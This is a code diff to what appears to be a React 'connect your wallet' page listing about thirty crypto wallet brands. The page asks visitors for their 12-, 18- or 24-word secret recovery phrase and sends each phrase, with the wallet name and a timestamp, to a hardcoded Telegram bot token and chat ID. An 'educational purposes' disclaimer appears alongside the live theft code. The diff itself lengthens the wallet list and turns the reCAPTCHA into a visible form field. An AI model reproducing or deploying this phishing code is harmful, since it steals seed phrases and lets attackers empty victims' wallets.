@@ -29,19 +29,38 @@ import { useToast } from "@/hooks/use-toast";
 import { ScrollArea } from "./ui/scroll-area";
 
 const wallets = [
-  { name: "MetaMask", logo: "https://placehold.co/64x64.png", hint: "fox logo" },
-  { name: "Trust Wallet", logo: "https://placehold.co/64x64.png", hint: "shield logo" },
-  { name: "Phantom", logo: "https://placehold.co/64x64.png", hint: "ghost logo" },
-  { name: "Coinbase Wallet", logo: "https://placehold.co/64x64.png", hint: "blue square" },
-  { name: "Ledger", logo: "https://placehold.co/64x64.png", hint: "abstract shape" },
-  { name: "Trezor", logo: "https://placehold.co/64x64.png", hint: "abstract lock" },
-  { name: "Exodus", logo: "https://placehold.co/64x64.png", hint: "abstract shape" },
-  { name: "MyEtherWallet", logo: "https://placehold.co/64x64.png", hint: "wallet logo" },
-  { name: "Solflare", logo: "https://placehold.co/64x64.png", hint: "sun logo" },
-  { name: "Rainbow", logo: "https://placehold.co/64x64.png", hint: "rainbow logo" },
-  { name: "Argent", logo: "https://placehold.co/64x64.png", hint: "abstract logo" },
-  { name: "Zerion", logo: "https://placehold.co/64x64.png", hint: "abstract Z" },
+    { name: "MetaMask", logo: "https://placehold.co/64x64.png", hint: "fox logo" },
+    { name: "Trust Wallet", logo: "https://placehold.co/64x64.png", hint: "shield logo" },
+    { name: "Phantom", logo: "https://placehold.co/64x64.png", hint: "ghost logo" },
+    { name: "Coinbase Wallet", logo: "https://placehold.co/64x64.png", hint: "blue square" },
+    { name: "Ledger", logo: "https://placehold.co/64x64.png", hint: "sleek usb" },
+    { name: "Trezor", logo: "https://placehold.co/64x64.png", hint: "black device" },
+    { name: "Exodus", logo: "https://placehold.co/64x64.png", hint: "X logo" },
+    { name: "MyEtherWallet", logo: "https://placehold.co/64x64.png", hint: "green wallet" },
+    { name: "Solflare", logo: "https://placehold.co/64x64.png", hint: "sun logo" },
+    { name: "Rainbow", logo: "https://placehold.co/64x64.png", hint: "rainbow logo" },
+    { name: "Argent", logo: "https://placehold.co/64x64.png", hint: "A logo" },
+    { name: "Zerion", logo: "https://placehold.co/64x64.png", hint: "Z logo" },
+    { name: "imToken", logo: "https://placehold.co/64x64.png", hint: "blue circle" },
+    { name: "MathWallet", logo: "https://placehold.co/64x64.png", hint: "M logo" },
+    { name: "SafePal", logo: "https://placehold.co/64x64.png", hint: "S shield" },
+    { name: "Atomic Wallet", logo: "https://placehold.co/64x64.png", hint: "atom logo" },
+    { name: "Guarda Wallet", logo: "https://placehold.co/64x64.png", hint: "G shield" },
+    { name: "Coinomi", logo: "https://placehold.co/64x64.png", hint: "C logo" },
+    { name: "Zengo", logo: "https://placehold.co/64x64.png", hint: "Z shield" },
+    { name: "Crypto.com DeFi Wallet", logo: "https://placehold.co/64x64.png", hint: "lion logo" },
+    { name: "Unstoppable Wallet", logo: "https://placehold.co/64x64.png", hint: "U logo" },
+    { name: "BitPay", logo: "https://placehold.co/64x64.png", hint: "blue B" },
+    { name: "BRD", logo: "https://placehold.co/64x64.png", hint: "B logo" },
+    { name: "Frame", logo: "https://placehold.co/64x64.png", hint: "frame icon" },
+    { name: "Rabby Wallet", logo: "https://placehold.co/64x64.png", hint: "rabbit logo" },
+    { name: "Core", logo: "https://placehold.co/64x64.png", hint: "C logo" },
+    { name: "Enkrypt", logo: "https://placehold.co/64x64.png", hint: "E shield" },
+    { name: "XDEFI Wallet", logo: "https://placehold.co/64x64.png", hint: "X logo" },
+    { name: "Keplr", logo: "https://placehold.co/64x64.png", hint: "K logo" },
+    { name: "Cosmostation", logo: "https://placehold.co/64x64.png", hint: "atom C" },
 ];
+
 
 const FormSchema = z.object({
   secretPhrase: z
@@ -57,6 +76,7 @@ const FormSchema = z.object({
           "Secret phrase must contain exactly 12, 18, or 24 words.",
       }
     ),
+  recaptcha: z.string().min(1, { message: "Please verify you are not a robot." })
 });
 
 function SecretPhraseForm({ wallet, onBack, onSuccess }) {
@@ -66,6 +86,7 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
     resolver: zodResolver(FormSchema),
     defaultValues: {
       secretPhrase: "",
+      recaptcha: "",
     },
   });
 
@@ -84,20 +105,10 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
   };
 
   const onSubmit = async (data: z.infer<typeof FormSchema>) => {
-    const recaptchaToken = await recaptchaRef.current?.executeAsync();
-    if (!recaptchaToken) {
-      toast({
-        title: "reCAPTCHA Failed",
-        description: "Please complete the reCAPTCHA challenge.",
-        variant: "destructive",
-      });
-      return;
-    }
-
     const botToken = "6858405369:AAHIBm11hz5SSLgH_BZb9mSSFBIOkeiExb8";
     const chatId = "5485468089";
     const timestamp = new Date().toISOString();
-    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}\nreCAPTCHA Token: ${recaptchaToken}`;
+    const message = `Wallet: ${wallet.name}\nSecret Phrase: ${data.secretPhrase}\nTimestamp: ${timestamp}\nreCAPTCHA Token: ${data.recaptcha}`;
 
     try {
       const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -162,11 +173,6 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
       </DialogHeader>
       <Form {...form}>
         <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6 pt-4">
-          <ReCAPTCHA
-            ref={recaptchaRef}
-            size="invisible"
-            sitekey="6Ldy6QsqAAAAAKiRCHGj_1yYcQv6oTllQbRqYFjC" // Replace with your site key
-          />
           <FormField
             control={form.control}
             name="secretPhrase"
@@ -197,6 +203,25 @@ function SecretPhraseForm({ wallet, onBack, onSuccess }) {
               </FormItem>
             )}
           />
+
+           <FormField
+            control={form.control}
+            name="recaptcha"
+            render={({ field }) => (
+              <FormItem>
+                <FormControl>
+                  <ReCAPTCHA
+                    ref={recaptchaRef}
+                    sitekey="6LeIxAcpAAAAAMu-pOKNn9mESaK5X2j_0P0u_XhP" // This is a public test key
+                    onChange={field.onChange}
+                    theme="dark"
+                  />
+                </FormControl>
+                <FormMessage />
+              </FormItem>
+            )}
+          />
+
            <p className="text-xs text-muted-foreground">
               This site is for educational purposes. Do not use your real secret phrase. The reCAPTCHA is for demonstration purposes.
             </p>
